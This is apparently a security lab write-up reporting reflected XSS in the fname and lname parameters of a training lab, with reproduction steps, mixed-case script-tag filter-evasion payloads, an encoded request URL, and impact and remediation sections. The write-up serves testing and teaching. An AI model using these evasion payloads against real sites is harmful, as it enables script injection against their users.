## Title
Reflected XSS - Script Tag Filter Evasion

## Description

I tested the First Name and Last Name fields in the Reflected XSS - Script Tag Filter Evasion lab (Lab 37) on KrazePlanetLabs.

During testing, I found that the application accepts user-controlled input through the `fname` and `lname` GET parameters. I submitted specially crafted mixed-case script-tag payloads to test the application's script-tag filtering.

After submitting the form, the browser navigated from `search.pwnedbox.site` to `feedback.pwnedbox.site`. Both payloads successfully executed JavaScript in the browser, displaying separate prompt dialogs containing `XSS1` and `XSS2`.

This confirms Reflected Cross-Site Scripting through both GET parameters.

**Affected URL:** https://feedback.pwnedbox.site/

**HTTP Method:** GET

**Affected Parameters:**
- `fname` - First Name
- `lname` - Last Name

## Steps to Reproduce

1. Open the lab URL: https://search.pwnedbox.site/
2. Navigate to the GET Parameter Reflection lab.
3. Enter the following payload in the First Name field:

   ```html
   "mihir'"><ScRipT>prompt("XSS1");</ScRipT>
   ```

4. Enter the following payload in the Last Name field:

   ```html
   "mihir'"><ScRipT>prompt("XSS2");</ScRipT>
   ```

5. Click the Submit button.
6. Observe that the browser navigates to `https://feedback.pwnedbox.site/`.
7. Observe the JavaScript prompt displaying `XSS1`.
8. Dismiss the first prompt and observe the second prompt displaying `XSS2`.

## POC (Proof of Concept)

**Lab Address:** https://feedback.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameters:** `fname`, `lname`

**1. First Name Parameter (`fname`)**

**Payload:**
```html
"mihir'"><ScRipT>prompt("XSS1");</ScRipT>
```

**Result:** A JavaScript prompt appeared displaying `XSS1`, confirming successful execution through the `fname` parameter.

**2. Last Name Parameter (`lname`)**

**Payload:**
```html
"mihir'"><ScRipT>prompt("XSS2");</ScRipT>
```

**Result:** A JavaScript prompt appeared displaying `XSS2`, confirming successful execution through the `lname` parameter.

**Request URL:**
```text
https://feedback.pwnedbox.site/?fname=%22mihir%27%22%3C%3E%3CScRipT%3Eprompt%28%22XSS1%22%29%3B%3C%2FScRipT%3E&lname=%22mihir%27%22%3C%3E%3CScRipT%3Eprompt%28%22XSS2%22%29%3B%3C%2FScRipT%3E
```

**Screenshots:**

<img width="1915" height="928" alt="image" src="https://github.com/user-attachments/assets/4c6fc968-52f2-4c0b-a5a7-5a3f3aefaa88" />
<img width="1914" height="1021" alt="image" src="https://github.com/user-attachments/assets/76a9b18b-dc69-4e2a-a18f-515434831ac7" />
<img width="1919" height="976" alt="image" src="https://github.com/user-attachments/assets/a9730bc5-f20c-47b6-956f-ff50159a7aa3" />
<img width="1919" height="985" alt="image" src="https://github.com/user-attachments/assets/e1ffe87b-c518-4ee0-8235-47419481aaaf" />



## Impact

1. An attacker could craft a malicious URL containing an XSS payload and trick a victim into opening it.
2. Successful exploitation could allow JavaScript execution in the victim's browser, potentially enabling phishing attacks and manipulation of application content.
3. Depending on application security protections, an attacker could potentially perform unauthorized actions within the victim's authenticated session.

## Remediation

1. Implement context-aware output encoding for all user-controlled input before inserting it into HTML attributes or page content.
2. Avoid unsafe DOM manipulation methods such as `innerHTML` when handling untrusted input.
3. Apply appropriate server-side input validation and sanitization as an additional security measure.
4. Implement a restrictive Content Security Policy (CSP) to reduce the risk of unauthorized script execution.
